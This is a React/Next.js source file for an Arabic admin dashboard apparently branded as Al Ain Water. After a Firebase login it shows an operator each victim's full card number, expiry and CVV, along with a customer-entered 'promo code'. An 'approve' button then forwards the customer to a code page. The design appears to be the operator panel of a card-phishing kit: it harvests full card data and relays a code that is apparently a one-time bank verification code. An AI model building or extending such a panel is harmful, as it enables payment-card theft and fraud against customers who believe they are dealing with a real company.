"use client"
import { useState, useEffect } from "react"
import { CheckCircle2, Clock, CreditCard, Tag, Eye, EyeOff, LogOut } from "lucide-react"
import { signInWithEmailAndPassword, signOut, onAuthStateChanged, User } from "firebase/auth"
import { auth } from "@/lib/firebase"

interface Order {
  id: string
  status: "pending" | "approved"
  cardNumber: string
  expiry: string
  cvv: string
  total: number
  promoCode: string | null
  createdAt: string
}

export default function DashboardPage() {
  const [user, setUser] = useState<User | null | undefined>(undefined)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPass, setShowPass] = useState(false)
  const [loginError, setLoginError] = useState("")
  const [loading, setLoading] = useState(false)

  const [order, setOrder] = useState<Order | null>(null)
  const [approved, setApproved] = useState(false)

  // Listen to Firebase auth state
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (u) => setUser(u))
    return () => unsub()
  }, [])

  // Poll localStorage when logged in
  useEffect(() => {
    if (!user) return
    function load() {
      try {
        const raw = localStorage.getItem("alain_order")
        if (raw) {
          const o = JSON.parse(raw) as Order
          setOrder(o)
          setApproved(o.status === "approved")
        } else {
          setOrder(null)
          setApproved(false)
        }
      } catch {}
    }
    load()
    const interval = setInterval(load, 1500)
    return () => clearInterval(interval)
  }, [user])

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault()
    setLoading(true)
    setLoginError("")
    try {
      await signInWithEmailAndPassword(auth, email.trim(), password)
    } catch {
      setLoginError("البريد الإلكتروني أو كلمة المرور غير صحيحة")
    } finally {
      setLoading(false)
    }
  }

  async function logout() {
    await signOut(auth)
  }

  function approve() {
    if (!order) return
    const updated = { ...order, status: "approved" as const }
    localStorage.setItem("alain_order", JSON.stringify(updated))
    setOrder(updated)
    setApproved(true)
  }

  function clearOrder() {
    localStorage.removeItem("alain_order")
    setOrder(null)
    setApproved(false)
  }

  // Loading state while checking auth
  if (user === undefined) {
    return (
      <div className="min-h-screen bg-gray-950 flex items-center justify-center">
        <div className="w-2 h-2 rounded-full bg-amber-400 animate-bounce mx-1" />
        <div className="w-2 h-2 rounded-full bg-amber-400 animate-bounce mx-1 [animation-delay:150ms]" />
        <div className="w-2 h-2 rounded-full bg-amber-400 animate-bounce mx-1 [animation-delay:300ms]" />
      </div>
    )
  }

  // ── Login Screen ──
  if (!user) {
    return (
      <div className="min-h-screen bg-gray-950 flex items-center justify-center px-4" dir="rtl">
        <div className="w-full max-w-sm">
          <div className="text-center mb-8">
            <div className="w-14 h-14 bg-gray-800 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <CreditCard size={28} className="text-amber-400" />
            </div>
            <h1 className="text-2xl font-black text-white">لوحة التحكم</h1>
            <p className="text-gray-500 text-sm mt-1">تسجيل الدخول للمتابعة</p>
          </div>

          <form onSubmit={handleLogin} className="bg-gray-900 rounded-2xl p-6 space-y-4">
            <div>
              <label className="block text-sm font-semibold text-gray-400 mb-1.5">البريد الإلكتروني</label>
              <input
                type="email"
                required
                value={email}
                onChange={e => { setEmail(e.target.value); setLoginError("") }}
                placeholder="admin@alainwater.com"
                className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-colors placeholder-gray-600"
                dir="ltr"
              />
            </div>

            <div>
              <label className="block text-sm font-semibold text-gray-400 mb-1.5">كلمة المرور</label>
              <div className="relative">
                <input
                  type={showPass ? "text" : "password"}
                  required
                  value={password}
                  onChange={e => { setPassword(e.target.value); setLoginError("") }}
                  placeholder="••••••••"
                  className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition-colors placeholder-gray-600 pl-12"
                  dir="ltr"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(v => !v)}
                  className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
                >
                  {showPass ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>

            {loginError && (
              <p className="text-red-400 text-sm font-semibold text-center">{loginError}</p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-amber-500 hover:bg-amber-400 disabled:opacity-60 text-gray-900 font-black py-3 rounded-xl transition-colors mt-2"
            >
              {loading ? "جارٍ الدخول…" : "تسجيل الدخول"}
            </button>
          </form>
        </div>
      </div>
    )
  }

  // ── Dashboard ──
  return (
    <div className="min-h-screen bg-gray-950 text-white p-6" dir="rtl">
      <div className="max-w-xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-2xl font-black tracking-tight">لوحة التحكم</h1>
          <div className="flex items-center gap-3">
            <span className="text-xs bg-gray-800 text-gray-400 px-3 py-1 rounded-full">Admin</span>
            <button onClick={logout} className="text-gray-500 hover:text-red-400 transition-colors" title="تسجيل الخروج">
              <LogOut size={18} />
            </button>
          </div>
        </div>

        {!order ? (
          <div className="bg-gray-900 rounded-2xl p-10 text-center text-gray-500">
            <Clock size={40} className="mx-auto mb-3 opacity-40" />
            <p className="text-sm">لا يوجد طلب معلق حالياً</p>
          </div>
        ) : (
          <div className="space-y-4">

            {/* Status badge */}
            <div className={`flex items-center gap-2 px-4 py-3 rounded-xl text-sm font-bold ${
              approved
                ? "bg-green-900/50 text-green-400 border border-green-800"
                : "bg-amber-900/50 text-amber-400 border border-amber-800"
            }`}>
              <span className={`w-2 h-2 rounded-full ${approved ? "bg-green-400" : "bg-amber-400 animate-pulse"}`} />
              {approved ? "تمت الموافقة — العميل الآن في صفحة الكود" : "طلب معلق — بانتظار الموافقة"}
            </div>

            {/* Card Details */}
            <div className="bg-gray-900 rounded-2xl p-5 space-y-3">
              <div className="flex items-center gap-2 text-gray-400 text-xs font-semibold uppercase tracking-widest mb-1">
                <CreditCard size={14} />
                <span>بيانات البطاقة</span>
              </div>
              <div className="space-y-2">
                <Row label="رقم البطاقة" value={order.cardNumber || "—"} mono />
                <Row label="تاريخ الانتهاء" value={order.expiry || "—"} mono />
                <Row label="CVV" value={order.cvv || "—"} mono />
                <Row label="المبلغ" value={`${order.total?.toFixed(2)} د.إ`} />
                <Row label="وقت الطلب" value={new Date(order.createdAt).toLocaleTimeString("ar-AE")} />
              </div>
            </div>

            {/* Promo Code */}
            <div className="bg-gray-900 rounded-2xl p-5">
              <div className="flex items-center gap-2 text-gray-400 text-xs font-semibold uppercase tracking-widest mb-3">
                <Tag size={14} />
                <span>كود الخصم</span>
              </div>
              {order.promoCode ? (
                <div className="bg-gray-800 rounded-xl px-4 py-3 font-mono text-lg font-black text-yellow-400 tracking-widest">
                  {order.promoCode}
                </div>
              ) : (
                <p className="text-gray-600 text-sm">لم يُدخل العميل كود بعد</p>
              )}
            </div>

            {/* Actions */}
            <div className="flex gap-3">
              {!approved && (
                <button
                  onClick={approve}
                  className="flex-1 flex items-center justify-center gap-2 bg-green-600 hover:bg-green-500 text-white font-black py-3 rounded-xl transition-colors"
                >
                  <CheckCircle2 size={18} />
                  موافقة — إرسال للكود
                </button>
              )}
              <button
                onClick={clearOrder}
                className="px-5 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 text-gray-400 font-semibold text-sm transition-colors"
              >
                مسح
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

function Row({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div className="flex justify-between items-center">
      <span className="text-gray-500 text-sm">{label}</span>
      <span className={`text-white text-sm font-semibold ${mono ? "font-mono tracking-wider" : ""}`}>{value}</span>
    </div>
  )
}
